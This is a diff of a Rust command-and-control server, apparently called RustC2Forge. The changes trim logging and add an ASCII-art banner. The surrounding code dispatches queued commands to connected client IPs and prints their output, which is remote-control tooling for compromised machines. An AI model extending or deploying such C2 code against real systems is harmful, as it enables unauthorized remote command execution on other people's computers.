@@ -42,14 +42,10 @@ pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
         let cmd: Option<String> = client_manager.get_command(&ip);
         if cmd != None {
             let cmd = cmd.unwrap();
-            println!("[I] Sending '{}' command to {}", cmd, ip);
             send_command(&stream, &cmd).unwrap();
 
-            println!("[I] Wainting for the output of the command command '{}' \
-                     sent to {}", cmd, ip);
-
             let command: ClientCommand = command_output(&mut reader).unwrap();
-            println!("Command {} output:\n{}", cmd, command.output.unwrap());
+            println!("\n{}\n", command.output.unwrap());
 
             client_manager.reset_command(&ip).unwrap();
         }
@@ -66,6 +62,18 @@ pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
 /// * `server_client_manager`: An instance of `ClientManager` used for client management.
 pub fn server(server_client_manager: ClientManager) {
     let mut cmd = String::new();
+    println!("
+
+██████╗ ██╗   ██╗███████╗████████╗ ██████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
+██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝╚════██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
+██████╔╝██║   ██║███████╗   ██║   ██║      █████╔╝█████╗  ██║   ██║██████╔╝██║  ███╗█████╗
+██╔══██╗██║   ██║╚════██║   ██║   ██║     ██╔═══╝ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
+██║  ██║╚██████╔╝███████║   ██║   ╚██████╗███████╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
+╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+
+                                                                                by Co3lho22
+
+             ");
 
     loop {
         println!("C2 => ");
